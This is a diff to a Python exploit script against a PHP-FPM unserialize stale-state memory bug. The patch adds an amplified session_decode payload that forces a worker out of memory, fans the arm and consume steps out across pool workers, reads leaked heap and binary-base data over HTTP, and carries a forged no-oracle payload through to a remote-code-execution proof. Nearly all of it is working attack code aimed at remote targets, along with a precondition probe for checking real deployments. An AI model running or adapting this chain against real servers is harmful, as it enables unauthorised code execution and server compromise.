@@ -19,6 +19,16 @@ BG(unserialize) stale state:
                php_var_unserialize_init() reuses d.  B reclaims d's slot with
                a controlled buffer and plants a forged var_entries.
 
+  The producer arm has two modes (--arm-mode, "auto" picks by origin):
+  builder  a second surface with a higher memory_limit writes the big
+           session (the classic two-pool path; both surfaces can share one
+           port behind --builder-prefix).
+  growth   ONE stock surface: an amplified session_decode (a wide nested
+           array payload) multiplies memory ~22x per payload byte while
+           BG(unserialize).level == 1, so a single POST OOMs inside
+           unserialize() - no big session file, no memory_limit split, no
+           single-worker pinning (the arm/consume fan out over --workers).
+
 Lab-only aid: the /proc/<pid>/mem oracle reads BG(unserialize).data (d),
 the worker's PIE base and buffer addresses, making the reclaim deterministic
 to calibrate.  `no-oracle` removes that oracle from the exploit path: it takes the two
@@ -39,6 +49,7 @@ Subcommands:
                    or local maps)
   chain            full pipeline (primitive or endgame phase)
   patchcheck       run lifecycle+oracle+producer+probe on 8.4.26 vs 8.4.27
+  probe            checklist: does this target meet every precondition?
 """
 
 from __future__ import annotations
@@ -77,21 +88,67 @@ PATHS = {
     "arm": "/bigvar.php",
     "ref": "/ref.php",
     "probe": "/nope.php",
+    "grow": "/grow.php",
     "cookie": "PHPSESSID",
 }
+
+# How the producer OOM session is armed on a remote target:
+#   builder — two HTTP surfaces (the current behaviour): a builder surface
+#             writes the big session, the chain surface OOMs on it.
+#   growth  — ONE surface with default settings: the session is grown in
+#             small chunks until a decode OOM arms the worker (the save of a
+#             session always costs more than the decode of the next round,
+#             so a stalled growth leaves the session just under memory_limit
+#             and one bigger body tips it over).
+#   auto    — growth when --builder is the same origin as --base (one pool),
+#             builder otherwise.
+ARM_MODE = "builder"
+BUILDER_PREFIX = ""      # path prefix of the builder pool on a single port
+WORKERS = 1              # arm/consume fan-out; the CLI default is 5 (see
+                         # --workers, matching pm.max_children of a stock
+                         # pool) - direct API callers keep the pinned 1
+GROW_CHUNK = 256 * 1024  # bytes appended to the session per growth round
+GROW_FINE = 64 * 1024    # creep size once the coarse rounds stall
+GROW_MAX = 4000          # growth rounds before the big-body probe takes over
+ARM_BODY = 1900000       # kept for --arm-body overrides; the probe itself
+                         # walks PROBE_LADDER (largest first) and caches the
+                         # largest body the target accepted
 
 
 def _cookie(sid: bytes) -> bytes:
     return PATHS["cookie"].encode("latin1") + b"=" + sid
 
 
+def _origin(url: str) -> str:
+    u = urllib.parse.urlsplit(url)
+    return f"{u.scheme}://{u.netloc}"
+
+
 def configure_paths(args) -> None:
+    global ARM_MODE, BUILDER_PREFIX, WORKERS, GROW_CHUNK, GROW_MAX, ARM_BODY
+    global _probe_usable
     for key, attr in (("app", "app_path"), ("arm", "arm_path"),
                       ("ref", "ref_path"), ("probe", "probe_path"),
-                      ("cookie", "session_cookie")):
+                      ("grow", "grow_path"), ("cookie", "session_cookie")):
         value = getattr(args, attr, None)
         if value:
             PATHS[key] = str(value)
+    BUILDER_PREFIX = str(getattr(args, "builder_prefix", "") or "")
+    mode = getattr(args, "arm_mode", None) or ARM_MODE
+    if mode == "auto":
+        base_url = getattr(args, "base", "") or ""
+        builder_url = getattr(args, "builder", "") or base_url
+        same_origin = _origin(base_url) == _origin(builder_url)
+        prefixed = bool(BUILDER_PREFIX)
+        mode = "growth" if (same_origin and not prefixed) else "builder"
+    ARM_MODE = mode
+    WORKERS = max(1, int(getattr(args, "workers", 1) or 1))
+    GROW_CHUNK = max(4096, int(getattr(args, "grow_chunk", 0) or GROW_CHUNK))
+    GROW_MAX = max(1, int(getattr(args, "grow_max", 0) or GROW_MAX))
+    ARM_BODY = max(4096, int(getattr(args, "arm_body", 0) or ARM_BODY))
+    # an explicit --arm-body pins the probe size; otherwise the ladder walks
+    # PROBE_LADDER and caches whatever the target accepted
+    _probe_usable = ARM_BODY if getattr(args, "arm_body", 0) else None
 
 
 # --------------------------------------------------------------------------- #
@@ -99,12 +156,17 @@ def configure_paths(args) -> None:
 # --------------------------------------------------------------------------- #
 
 class Target:
-    def __init__(self, url: str, timeout: float = 60.0):
+    def __init__(self, url: str, timeout: float = 60.0, prefix: str = ""):
         u = urllib.parse.urlsplit(url)
         self.host = u.hostname or "127.0.0.1"
         self.port = u.port or 80
         self.path = u.path or "/"
+        self.prefix = prefix
         self.timeout = timeout
+
+    def _p(self, path: str) -> str:
+        """Path with the surface prefix applied (builder pool behind /b/)."""
+        return (self.prefix + path) if self.prefix else path
 
     def _connect(self) -> socket.socket:
         sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
@@ -141,11 +203,12 @@ class Target:
         return status, headers, body
 
     def get(self, path: str, cookie: bytes | None = None,
-            read_cap: int = 1 << 22) -> tuple[int, dict[str, str], bytes]:
+            read_cap: int = 1 << 22,
+            timeout: float | None = None) -> tuple[int, dict[str, str], bytes]:
         extra = f"Cookie: {cookie.decode('latin1')}\r\n" if cookie else ""
-        req = (f"GET {path} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n"
+        req = (f"GET {self._p(path)} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n"
                f"{extra}Connection: close\r\n\r\n").encode()
-        return self._exch(req, read_cap=read_cap)
+        return self._exch(req, read_cap=read_cap, timeout=timeout)
 
     def post_multipart(self, parts: list[dict], boundary: bytes,
                        cookie: bytes | None = None,
@@ -153,7 +216,7 @@ class Target:
                        timeout: float | None = None) -> tuple[int, dict[str, str], bytes]:
         body = build_multipart(parts, boundary)
         extra = f"Cookie: {cookie.decode('latin1')}\r\n" if cookie else ""
-        req = (f"POST {self.path} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n"
+        req = (f"POST {self._p(self.path)} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n"
                f"{extra}"
                f"Content-Type: multipart/form-data; boundary={boundary.decode('latin1')}\r\n"
                f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body
@@ -161,13 +224,41 @@ class Target:
 
     def post_urlencoded(self, fields: dict[str, str],
                         cookie: bytes | None = None,
-                        path: str | None = None) -> tuple[int, dict[str, str], bytes]:
+                        path: str | None = None,
+                        timeout: float | None = None) -> tuple[int, dict[str, str], bytes]:
         body = urllib.parse.urlencode(fields).encode()
         extra = f"Cookie: {cookie.decode('latin1')}\r\n" if cookie else ""
-        req = (f"POST {path or self.path} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n"
+        req = (f"POST {self._p(path or self.path)} HTTP/1.1\r\n"
+               f"Host: {self.host}:{self.port}\r\n"
                f"{extra}Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body
-        return self._exch(req)
+        return self._exch(req, timeout=timeout)
+
+    def post_raw(self, path: str, body: bytes, cookie: bytes | None = None,
+                 timeout: float | None = None) -> tuple[int, dict[str, str], bytes]:
+        """POST an already-encoded application/x-www-form-urlencoded body.
+
+        urlencode() would percent-escape the amplifier payload's braces and
+        semicolons, tripling it past post_max_size; the url-encoded parser
+        passes raw bytes through untouched as long as they contain no '+'
+        or '%', which the payload never does.
+        """
+        extra = f"Cookie: {cookie.decode('latin1')}\r\n" if cookie else ""
+        req = (f"POST {self._p(path)} HTTP/1.1\r\n"
+               f"Host: {self.host}:{self.port}\r\n"
+               f"{extra}Content-Type: application/x-www-form-urlencoded\r\n"
+               f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body
+        return self._exch(req, timeout=timeout)
+
+
+def builder_target(url: str, timeout: float = 60.0) -> Target:
+    """The builder surface: same client as the chain, with the pool prefix.
+
+    On a single-port deployment the builder pool sits behind a path prefix
+    (``--builder-prefix /b``), so every builder request - posts *and* gets -
+    is routed there instead of to the chain pool.
+    """
+    return Target(url, timeout=timeout, prefix=BUILDER_PREFIX)
 
 
 def build_multipart(parts: list[dict], boundary: bytes) -> bytes:
@@ -335,6 +426,250 @@ def ref_session_post(builder: Target, sid: bytes) -> tuple[int, bytes]:
 def producer_get(chain: Target, sid: bytes) -> tuple[int, bytes]:
     status, _headers, body = chain.get(PATHS["app"], cookie=_cookie(sid))
     return status, body
+
+
+# --------------------------------------------------------------------------- #
+# growth arm (single surface, default php.ini)
+# --------------------------------------------------------------------------- #
+
+# Decode-side amplifier: payload sizes tried largest first.  A payload of
+# N bytes decodes to roughly 22N bytes of live HashTables (28-byte
+# two-deep children -> ~620 bytes), so a ~8 MB payload (post_max_size's
+# default is 8M) crosses memory_limit of a 128M surface from an EMPTY
+# session.  Fronts that cap bodies descend the ladder.
+AMPLIFIER_SIZES = (8200000, 6000000, 4800000, 3000000, 1000000)
+_amplifier_cache: dict[int, bytes] = {}
+_amplifier_usable: int | None = None
+
+
+def _amplifier_payload(nbytes: int) -> bytes:
+    """A session-format string whose decode multiplies memory ~20x.
+
+    Shape: ``k|a:<n>{i:0;a:1:{i:0;a:1:{i:0;N;}}...}`` - one wide array of
+    two-deep non-empty sub-arrays.  Empty arrays are useless here (PHP
+    interns ``a:0:{}`` process-wide, so they cost nothing); a two-element
+    nesting gives ~620 bytes of live HashTables per ~28 payload bytes while
+    keeping the nesting depth at 4 (unserialize_max_depth is never
+    approached).  The decode runs with BG(unserialize).level == 1, so an
+    OOM anywhere inside leaves exactly the stale struct the chain reclaims.
+    """
+    cached = _amplifier_cache.get(nbytes)
+    if cached is not None:
+        return cached
+    child = b"a:1:{i:0;a:1:{i:0;N;}}"
+    # Short strings FIRST: the stale var_hash then carries them at
+    # data[0..3], which is exactly what the HTTP leak's R:2 hook reads
+    # (the classic bigvar.php arm stored k0..k3 for the same reason).
+    seed = (b'a|s:2000:"' + b"K" * 2000 + b'";'
+            b'b|s:2000:"' + b"L" * 2000 + b'";'
+            b'c|s:2000:"' + b"M" * 2000 + b'";'
+            b'd|s:2000:"' + b"N" * 2000 + b'";')
+    # conservative per-child budget: i:<6 digits>;<child> tops out at 32
+    # bytes, so a 14-byte margin keeps the total under nbytes and well
+    # inside post_max_size (8M) and an 8m client_max_body_size
+    count = max(16, min(500000, (nbytes - len(seed)) // (len(child) + 14)))
+    items = [b"i:" + str(i).encode("ascii") + b";" + child
+             for i in range(count)]
+    # full session-format payload: grow.php passes it to session_decode as-is
+    blob = (seed + b"k|a:" + str(count).encode("ascii") + b":{"
+            + b"".join(items) + b"}")
+    _amplifier_cache[nbytes] = blob
+    return blob
+
+
+def _amplifier_arm(target: Target, sid: bytes) -> bool | None:
+    """Arm with ONE amplified session_decode.  True=armed, None=survived."""
+    global _amplifier_usable
+    ladder = (_amplifier_usable,) if _amplifier_usable else AMPLIFIER_SIZES
+    for size in ladder:
+        payload = _amplifier_payload(size)
+        try:
+            status, _headers, body = target.post_raw(
+                PATHS["grow"], b"p=" + payload, cookie=_cookie(sid),
+                timeout=300.0)
+        except (OSError, TimeoutError):
+            return True      # worker died mid-request: treat as armed
+        body = _dechunk(body)
+        if status == 413:
+            continue         # front caps bodies: try a smaller payload
+        if b"GROW_OK" not in body:
+            return True      # fatal inside session_decode -> OOM -> armed
+        match = re.search(rb"GROW_OK \d+ B(\d+)", body)
+        if match and int(match.group(1)) == len(payload):
+            _amplifier_usable = size   # payload arrived, decode survived
+            return None
+        # payload discarded by post_max_size: descend
+    return False
+
+
+def _grow_size(body: bytes) -> int:
+    """Bytes of session payload reported by grow.php, or -1."""
+    match = re.search(rb"GROW_OK (\d+)", body)
+    return int(match.group(1)) if match else -1
+
+
+def _grow_round(target: Target, sid: bytes, index: int,
+                chunk: int | None = None) -> tuple[bool, int]:
+    """One growth round.  Returns (armed, session_bytes).
+
+    grow.php echoes GROW_OK only *after* session_start(): a decode OOM is a
+    fatal before the marker, which is how the arm is detected over HTTP.
+    """
+    chunk = GROW_CHUNK if chunk is None else chunk
+    fields = {"k": f"g{index:05d}", "v": "A" * chunk}
+    try:
+        _status, _headers, body = target.post_urlencoded(
+            fields, cookie=_cookie(sid), path=PATHS["grow"], timeout=180.0)
+    except (OSError, TimeoutError):
+        return True, -1     # the worker died mid-request: treat as armed
+    body = _dechunk(body)
+    if b"GROW_OK" not in body:
+        return True, -1     # fatal during session_start() -> OOM -> armed
+    return False, _grow_size(body)
+
+
+# Probe body ladder, largest first: post_max_size's default (8M) accepts
+# 8,000,000, and the crossing formula (2F + body + baseline >= memory_limit,
+# everything in bytes) needs ~8 MB of body when the save wall sits at ~63 MB
+# of a 128M surface.  The smaller steps adapt to fronts that cap bodies.
+PROBE_LADDER = (8000000, 5000000, 3000000, 1900000, 1040000)
+_probe_usable: int | None = None   # largest body this target actually took
+
+
+def _arm_probe(target: Target, sid: bytes) -> bool:
+    """Tip a stalled growth over memory_limit with one bigger body.
+
+    The body is parsed before RINIT and stays allocated while the session
+    decodes, so it raises the decode peak by its own size - the one lever
+    the save does not get: the save carries the encode buffer on top of
+    the zvals, which is why it dies first.  grow.php reports how many body
+    bytes arrived (``B<n>``); a body over post_max_size is discarded
+    silently, which the ladder treats like a 413 and descends past.
+    """
+    global _probe_usable
+    ladder = (_probe_usable,) if _probe_usable else PROBE_LADDER
+    for body_bytes in ladder:
+        fields = {"x": "B" * body_bytes}
+        try:
+            status, _headers, body = target.post_urlencoded(
+                fields, cookie=_cookie(sid), path=PATHS["grow"],
+                timeout=300.0)
+        except (OSError, TimeoutError):
+            return True
+        body = _dechunk(body)
+        if status == 413:
+            continue        # front caps bodies: try a smaller one
+        if b"GROW_OK" not in body:
+            return True     # fatal before the marker -> OOM -> armed
+        match = re.search(rb"GROW_OK \d+ B(\d+)", body)
+        arrived = int(match.group(1)) if match else -1
+        if arrived == body_bytes:
+            _probe_usable = body_bytes   # full body landed, still under
+            return False
+        # body discarded by post_max_size: descend
+    print(f"[!] no probe body got through (413 or post_max_size below "
+          f"{PROBE_LADDER[-1]}): raise client_max_body_size to >= 2m and "
+          f"post_max_size to 8M on the target")
+    return False
+
+
+def grow_until_armed(base: str, sid: bytes = OOM_SID) -> bool:
+    """Arm a decode-side OOM on ONE default surface.
+
+    Primary path: a single amplified ``session_decode`` - a few MB of wide
+    empty-array payload decodes to far more than memory_limit while
+    BG(unserialize).level == 1, with no session file, no save, and no wall
+    to chase.  Fallback: grow the session to the save wall and cross it
+    with a big-body probe (for fronts that cap payloads too low for the
+    amplifier).  Either way the OOM runs post-RINIT inside a
+    session_start()/session_decode() call, which is the producer arm.
+    """
+    target = Target(base)
+    amplified = _amplifier_arm(target, sid)
+    if amplified:
+        print("[*] arm: amplified session_decode OOM (single request)")
+        return True
+    if amplified is None:
+        print("[*] arm: amplifier payload arrived but did not cross; "
+              "falling back to growth")
+    else:
+        print("[*] arm: no amplifier payload got through (413 or "
+              "post_max_size); falling back to growth")
+    last, stall, probes = -1, 0, 0
+    coarse = True
+    for index in range(GROW_MAX):
+        chunk = GROW_CHUNK if coarse else GROW_FINE
+        armed, size = _grow_round(target, sid, index, chunk)
+        if armed:
+            print(f"[*] growth arm: OOM at round {index}")
+            return True
+        if size > last:
+            # progress: reopen the coarse throttle (the save landed)
+            if not coarse:
+                print(f"[*] growth resumed at ~{size} bytes")
+            last, stall, probes = size, 0, 0
+            coarse = True
+            continue
+        # no progress: either the save did not land yet or we are at the wall
+        stall += 1
+        if stall >= 2 and coarse:
+            print(f"[*] growth stalled at ~{last} bytes; creeping with "
+                  f"{GROW_FINE} byte rounds")
+            coarse, stall = False, 0
+            continue
+        if not coarse and stall >= 6:
+            if probes % 3 == 0:
+                print(f"[*] probing the wall at ~{last} bytes ({probes + 1})")
+                if _arm_probe(target, sid):
+                    return True
+            probes += 1
+            stall = 0
+            if probes >= 40:
+                break
+        time.sleep(0.05)    # give the previous request's save time to land
+    # A grown session shrinks the payload the amplifier needs: with ~60 MB
+    # on disk a 3 MB rung crosses memory_limit even on a front that caps
+    # bodies around 3-4 m, so give the amplifier one more shot here.
+    if _amplifier_arm(target, sid):
+        print("[*] arm: amplified session_decode OOM after growth")
+        return True
+    print(f"[!] growth reached ~{last} bytes but no OOM crossed "
+          f"memory_limit: arming needs 2 x session + probe body >= the "
+          f"limit, so either the front capped the probe body below "
+          f"{PROBE_LADDER[-1]} bytes (nginx client_max_body_size 8m, "
+          f"post_max_size 8M), session.lazy_write=On caps the save wall "
+          f"near 40 MB, or the consumer memory_limit is too high for this "
+          f"surface - a second surface with a lower memory_limit still "
+          f"works.")
+    return False
+
+
+def _remote_arm(base: str, builder_url: str, size: int) -> None:
+    """Rebuild the OOM session and fire the producer (remote paths).
+
+    builder mode fans out over WORKERS so every pool worker carries the
+    stale state (the consume then only has to land on *an* armed worker);
+    growth mode arms the worker that runs the final round and the caller
+    consumes immediately after it.
+    """
+    if ARM_MODE == "growth":
+        # One amplifier request arms the worker that takes it; repeat across
+        # the pool so every pm.max_children worker carries the stale state
+        # (RINIT only clears the worker a request lands on, so earlier arms
+        # stay standing).  Each round is a single request.
+        for _ in range(WORKERS):
+            if not grow_until_armed(base):
+                raise RuntimeError(
+                    "growth arm failed: the session never reached "
+                    "memory_limit (raise --arm-body, lower --grow-chunk, or "
+                    "point --grow-path at an endpoint that appends to the "
+                    "session)")
+        return
+    chain = Target(base)
+    builder = builder_target(builder_url)
+    for _ in range(WORKERS):
+        big_session_post(builder, OOM_SID, size)
+        producer_get(chain, OOM_SID)
 
 
 # --------------------------------------------------------------------------- #
@@ -513,7 +848,7 @@ def cmd_lifecycle(args) -> int:
 
     # post-RINIT OOM: producer (needs a big session; build one if missing)
     if not os.path.isfile(session_file(version, OOM_SID)):
-        builder = Target(args.builder)
+        builder = builder_target(args.builder)
         print("[*] building oom session (4MB) ...")
         big_session_post(builder, OOM_SID, 4 << 20)
     worker3 = find_pool_worker(version, "chain")
@@ -533,7 +868,7 @@ def cmd_oracle(args) -> int:
 
 
 def cmd_build_oom(args) -> int:
-    builder = Target(args.builder)
+    builder = builder_target(args.builder)
     sid = args.sid.encode("latin1")
     status, _body = big_session_post(builder, sid, args.size)
     path = session_file(args.version, sid)
@@ -543,7 +878,7 @@ def cmd_build_oom(args) -> int:
 
 
 def cmd_build_ref(args) -> int:
-    builder = Target(args.builder)
+    builder = builder_target(args.builder)
     sid = REF_SID
     status, body = ref_session_post(builder, sid)
     path = session_file(args.version, sid)
@@ -584,7 +919,7 @@ def _hexdump(data: bytes, base: int, limit: int = 96) -> str:
 
 def cmd_reclaim_probe(args) -> int:
     chain = Target(args.base)
-    builder = Target(args.builder)
+    builder = builder_target(args.builder)
     oracle = Oracle(args.version)
     pads = ([int(x) for x in args.sweep.split(",")] if args.sweep
             else [args.pad])
@@ -758,7 +1093,7 @@ def cmd_primitive(args) -> int:
     base = Target(args.base)
     chain404 = Target(args.base + PATHS["probe"])
     chainapp = Target(args.base + PATHS["app"])
-    builder = Target(args.builder)
+    builder = builder_target(args.builder)
     oracle = Oracle(args.version)
     pads = _reclaim_pads(args.version, getattr(args, "reclaim_pads", None))
     layout = _layout(args.version)
@@ -924,7 +1259,7 @@ def cmd_endgame(args) -> int:
     base = Target(args.base)
     chain404 = Target(args.base + PATHS["probe"])
     chainapp = Target(args.base + PATHS["app"])
-    builder = Target(args.builder)
+    builder = builder_target(args.builder)
     oracle = Oracle(args.version)
     pads = _reclaim_pads(args.version, getattr(args, "reclaim_pads", None))
     layout = _layout(args.version)
@@ -1017,20 +1352,36 @@ def _no_oracle_geometry(
     path = os.path.join(ROOT, "profiles", f"{version}-fpm.json")
     try:
         with open(path, encoding="utf-8") as handle:
-            fpm = json.load(handle)["fpm"]["no_oracle"]
-        return (int(fpm["reclaim_size"]),
+            fpm = json.load(handle)["fpm"]
+        section = fpm["no_oracle"]
+        # the single-surface amplifier arm leaves the heap in a different
+        # shape than the classic two-surface arm: when calibrated, its
+        # slots live in fpm.growth and win in growth mode
+        growth = fpm.get("growth") or {}
+        if ARM_MODE == "growth":
+            section = {**section,
+                       **{key: growth[key] for key in
+                          ("candidates", "reclaim_pads", "reclaim_size")
+                          if key in growth}}
+        return (int(section["reclaim_size"]),
                 [(int(c["d_off"], 16), int(c["k"], 16))
-                 for c in fpm["candidates"]],
-                [int(x) for x in fpm.get("reclaim_pads", [4096, 4096, 4096])])
+                 for c in section["candidates"]],
+                [int(x) for x in section.get("reclaim_pads",
+                                             fpm["reclaim_pads"])])
     except (OSError, KeyError, TypeError, ValueError):
         return fallback
 
 
-def _leak_geometry(version: str) -> dict | None:
+def _leak_geometry(version: str, mode: str | None = None) -> dict | None:
     path = os.path.join(ROOT, "profiles", f"{version}-fpm.json")
     try:
         with open(path, encoding="utf-8") as handle:
-            leak = json.load(handle)["fpm"]["leak"]
+            fpm = json.load(handle)["fpm"]
+        mode = mode or ARM_MODE
+        # growth mode reads the amplifier arm's leak geometry when the
+        # build has one; the offsets shift with the arm's heap footprint
+        leak = ((fpm.get("growth") or {}).get("leak")
+                if mode == "growth" else None) or fpm["leak"]
     except (OSError, KeyError, TypeError):
         return None
     try:
@@ -1083,7 +1434,7 @@ def _leak_read(base_url: str, builder_url: str, version: str, geom: dict,
     """
     chain = Target(base_url)
     app = Target(base_url + PATHS["app"])
-    builder = Target(builder_url)
+    builder = builder_target(builder_url)
     size = geom["size"]
     read_len = geom["read_len"]
     header = geom["header_content_off"]
@@ -1110,19 +1461,29 @@ def _leak_read(base_url: str, builder_url: str, version: str, geom: dict,
             ref_session_post(builder, REF_SID)
             app.get(PATHS["app"], cookie=_cookie(REF_SID))
         try:
-            builder.get(geom["arm_path"], cookie=_cookie(OOM_SID))
-            chain.get(PATHS["app"], cookie=_cookie(OOM_SID))
-            ref_session_post(builder, REF_SID)
-            _status, _headers, body = app.post_multipart(
-                parts, b"HTTPLEAK", cookie=_cookie(REF_SID),
-                timeout=180.0)
-            raw = _dechunk(body)
-            idx = raw.find(b"r\t")
-            if idx < 0:
-                continue
-            read = raw[idx + 2:idx + 2 + read_len]
-            if len(read) >= read_len:
-                return read
+            if ARM_MODE == "growth":
+                # On a single pool every request that reaches RINIT clears the
+                # stale state, so the reference rebuild runs *before* the
+                # growth arm and nothing sits between the arm and the consume.
+                ref_session_post(builder, REF_SID)
+                _remote_arm(base_url, builder_url, 4 << 20)
+            else:
+                builder.get(geom["arm_path"], cookie=_cookie(OOM_SID))
+                chain.get(PATHS["app"], cookie=_cookie(OOM_SID))
+                ref_session_post(builder, REF_SID)
+            # the fan-out mirrors no-oracle: the leak read only works on the
+            # worker that carries the stale state, so try every worker
+            for _fan in range(WORKERS):
+                _status, _headers, body = app.post_multipart(
+                    parts, b"HTTPLEAK", cookie=_cookie(REF_SID),
+                    timeout=180.0)
+                raw = _dechunk(body)
+                idx = raw.find(b"r\t")
+                if idx < 0:
+                    continue
+                read = raw[idx + 2:idx + 2 + read_len]
+                if len(read) >= read_len:
+                    return read
         except (OSError, RuntimeError, TimeoutError):
             continue
     return None
@@ -1176,7 +1537,7 @@ def leak_bases_http(base_url: str, builder_url: str, version: str,
 LEAK_HEADER_GRID = (0x17E8, 0x16E8, 0x18E8, 0x15E8, 0x19E8, 0x1000,
                     0x1200, 0x1400, 0x1A00, 0x1C00, 0x2000, 0x2400,
                     0x2800, 0x3000)
-LEAK_READ_LEN = 0x15810
+LEAK_READ_LEN = 0x1C000
 # Offsets of the executable (r-x) mapping inside a PHP build.  The binary
 # starts with one 2MB read-only page and its code spans a few MB after it
 # (5.3 MB on 8.2, 4.9 MB on 8.4).  Anything a base candidate has to explain
@@ -1374,7 +1735,7 @@ def cmd_no_oracle(args) -> int:
     base = Target(args.base)
     chain404 = Target(args.base + PATHS["probe"])
     chainapp = Target(args.base + PATHS["app"])
-    builder = Target(args.builder)
+    builder = builder_target(args.builder)
     local_proof = os.path.join(LAB, "webroot", proof)
 
     print(f"[*] no-oracle: chunk=0x{chunk:x} pie=0x{pie:x} zif=0x{zif:x}")
@@ -1384,27 +1745,39 @@ def cmd_no_oracle(args) -> int:
         d = chunk + d_off
         with contextlib.suppress(OSError):
             os.remove(local_proof)
-        # arm #1, then normalize the post-arm heap with a pads+big request
-        # that has the same allocation shape as the calibrated probe.
-        big_session_post(builder, OOM_SID, args.size)
-        producer_get(base, OOM_SID)
         parts = [{"name": f"pad{i}", "data": b"C" * pad}
                  for i, pad in enumerate(pads)]
         parts.append({"name": "big", "data": b"\x00" * size})
-        chain404.post_multipart(parts, b"NORACLE0", timeout=120.0)
-        # rebuild the ref session and re-arm
-        ref_session_post(builder, REF_SID)
-        big_session_post(builder, OOM_SID, args.size)
-        producer_get(base, OOM_SID)
+        if ARM_MODE == "growth":
+            # everything that can reach RINIT on the chain pool runs first:
+            # the growth arm is one-shot and any later request would memset
+            # the stale state it just created.
+            chain404.post_multipart(parts, b"NORACLE0", timeout=120.0)
+            ref_session_post(builder, REF_SID)
+            _remote_arm(args.base, args.builder, args.size)
+        else:
+            # arm #1, then normalize the post-arm heap with a pads+big request
+            # that has the same allocation shape as the calibrated probe.
+            _remote_arm(args.base, args.builder, args.size)
+            chain404.post_multipart(parts, b"NORACLE0", timeout=120.0)
+            # rebuild the ref session and re-arm (x WORKERS on multi-worker pools)
+            ref_session_post(builder, REF_SID)
+            _remote_arm(args.base, args.builder, args.size)
         forged = _build_endgame_payload(d, k, size, zif, command, layout)
-        status, _h, _b = _consume_b(chainapp, forged, pads)
-        print(f"[*] attempt {attempt}: d=0x{d:x} k=0x{k:x} status={status}")
-        for _ in range(6):
-            time.sleep(0.5)
-            pstatus, _ph, pbody = base.get("/" + proof)
-            if pstatus == 200 and pbody:
-                print(f"[+] RCE proof via /{proof}: {pbody[:120]!r}")
-                return 0
+        # One arm only lives in the worker that took the producer request, so
+        # the consume is fanned out over the pool instead of hoping to land
+        # on that one worker (a miss on an unarmed worker is a no-op request
+        # and leaves the armed workers standing).
+        for fan in range(WORKERS):
+            status, _h, _b = _consume_b(chainapp, forged, pads)
+            print(f"[*] attempt {attempt}.{fan}: d=0x{d:x} k=0x{k:x} "
+                  f"status={status}")
+            for _ in range(4):
+                time.sleep(0.4)
+                pstatus, _ph, pbody = base.get("/" + proof)
+                if pstatus == 200 and pbody:
+                    print(f"[+] RCE proof via /{proof}: {pbody[:120]!r}")
+                    return 0
         print("    no proof, retrying")
     print(f"[!] no proof at /{proof}")
     return 1
@@ -1448,10 +1821,23 @@ def _remote_arm_and_normalize(base: str, builder: str, size: int,
     producer, throw one pads+big request at a 404 endpoint so the heap
     looks the same on every attempt, then rebuild the reference session and
     re-arm.
+
+    In growth mode everything that can reach RINIT on the chain pool (the
+    normalize probe, the reference rebuild) runs *before* the arm, because
+    the growth arm is one-shot: any later request would memset the stale
+    state it just created.
     """
-    chain = Target(base)
     chain404 = Target(base + PATHS["probe"])
-    builder_t = Target(builder)
+    if ARM_MODE == "growth":
+        chain404.post_multipart(
+            [{"name": f"pad{i}", "data": b"C" * pad} for i, pad in enumerate(pads)]
+            + [{"name": "big", "data": b"\x00" * normalize}],
+            b"RMTNORM1", timeout=120.0)
+        ref_session_post(builder_target(builder), REF_SID)
+        _remote_arm(base, builder, size)
+        return
+    chain = Target(base)
+    builder_t = builder_target(builder)
     big_session_post(builder_t, OOM_SID, 4 << 20)
     producer_get(chain, OOM_SID)
     parts = [{"name": f"pad{i}", "data": b"C" * pad}
@@ -1602,12 +1988,18 @@ def cmd_calibrate(args) -> int:
     budget = int(getattr(args, "budget", 160))
     for candidate_geometry, geometry_chunk, pie_pointers in geometries:
         geometry_chunk &= ~(MEM_CHUNK - 1)
+        # one base is one guess: junk clusters repeat the same derived base
+        # for every pointer, and the budget is global
+        seen_bases: set[int] = set()
         for pie_off, pie_ptr in pie_pointers:
             aligned = pie_ptr & ~(MEM_CHUNK - 1)
             for steps in range(0, 6):
                 candidate = aligned - steps * MEM_CHUNK
                 if candidate <= 0:
                     break
+                if candidate in seen_bases:
+                    continue
+                seen_bases.add(candidate)
                 offset = pie_ptr - candidate
                 if offset >= code_high:
                     break    # further steps only push it out of the code
@@ -1654,13 +2046,24 @@ def cmd_calibrate(args) -> int:
     try:
         with open(path, encoding="utf-8") as handle:
             profile = json.load(handle)
-        profile["fpm"]["leak"] = geometry
-        profile["fpm"]["no_oracle"]["candidates"] = [
-            {"d_off": hex(d_off), "k": hex(k)} for d_off, k in winners]
-        profile["fpm"]["no_oracle"]["reclaim_pads"] = list(pads)
-        profile["fpm"]["no_oracle"]["reclaim_size"] = reclaim_size
-        profile["fpm"]["reclaim_pads"] = list(pads)
-        profile["fpm"]["reclaim_size"] = reclaim_size
+        winners_field = [{"d_off": hex(d_off), "k": hex(k)}
+                         for d_off, k in winners]
+        if ARM_MODE == "growth":
+            # single-surface amplifier arm: keep the classic two-surface
+            # geometry (the live CI lab runs on it) and store this one
+            # under fpm.growth
+            growth = profile["fpm"].setdefault("growth", {})
+            growth["leak"] = geometry
+            growth["candidates"] = winners_field
+            growth["reclaim_pads"] = list(pads)
+            growth["reclaim_size"] = reclaim_size
+        else:
+            profile["fpm"]["leak"] = geometry
+            profile["fpm"]["no_oracle"]["candidates"] = winners_field
+            profile["fpm"]["no_oracle"]["reclaim_pads"] = list(pads)
+            profile["fpm"]["no_oracle"]["reclaim_size"] = reclaim_size
+            profile["fpm"]["reclaim_pads"] = list(pads)
+            profile["fpm"]["reclaim_size"] = reclaim_size
         profile["fpm"]["no_oracle"]["bases"] = (
             "chunk from the 2MB-aligned leaked pointer, PIE base validated "
             "with a remote endgame; both stable for the FPM master lifetime")
@@ -1682,6 +2085,123 @@ def cmd_calibrate(args) -> int:
         print(f"[!] could not update the profile: {exc}")
         return 1
     return 0
+
+
+def cmd_probe(args) -> int:
+    """Check every precondition of the chain against one target, HTTP only.
+
+    Turns the "stellar alignments" checklist into a report: vulnerable
+    version, application session operation, reflection channel, reference
+    endpoint, accumulating endpoint, and the decisive memory physics - can
+    a decode OOM be reached on this surface at all?  The arm check grows a
+    session up to the decode wall of the target, so it sends a few hundred
